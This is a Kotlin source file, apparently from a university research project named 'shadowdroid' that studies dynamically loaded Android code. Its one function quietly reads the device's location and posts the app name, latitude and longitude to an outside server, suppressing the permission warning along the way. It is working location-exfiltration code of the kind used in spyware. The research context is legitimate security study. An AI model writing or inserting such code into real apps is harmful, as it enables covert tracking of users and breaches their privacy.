package nl.tbethe.shadowdroid.dex

import android.Manifest
import android.annotation.SuppressLint
import android.content.pm.PackageManager
import android.location.Criteria
import android.location.LocationManager
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.request.forms.*
import io.ktor.client.statement.*
import io.ktor.http.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

private const val TAG = "DynDownloadedClass"

class DynamicallyDownloadedClass {
    companion object {

        @SuppressLint("MissingPermission")
        fun leakLocation(activity: ComponentActivity) {
            Log.d(TAG, "Leaking location")
            val locationManager = activity.getSystemService(LocationManager::class.java)
            val provider : String? = locationManager.getBestProvider(Criteria(), true)
            provider?.let {
                locationManager.requestSingleUpdate(provider, { loc ->
                    val url = "https://vm-thijs.ewi.utwente.nl/shadow-droid/leak"
                    CoroutineScope(Dispatchers.IO).launch {
                        try {
                            HttpClient(CIO).use { client ->
                                val response = client.submitForm<HttpResponse>(
                                    url,
                                    Parameters.build {
                                        append("appname", activity.packageName)
                                        append("latitude", "${loc.latitude}")
                                        append("longitude", "${loc.longitude}")
                                    },
                                    false
                                )
                                Log.d(TAG, "Response status: ${response.status}")
                                Log.d(TAG, "Response: ${response.readText()}")
                            }
                        } catch (e: Exception) {
                            Log.d(TAG, "IO Exception occurred when trying to exfiltrate data")
                        }
                    }
                }, null)
            } ?: Log.d(TAG, "No Location provider found")
        }
    }
}
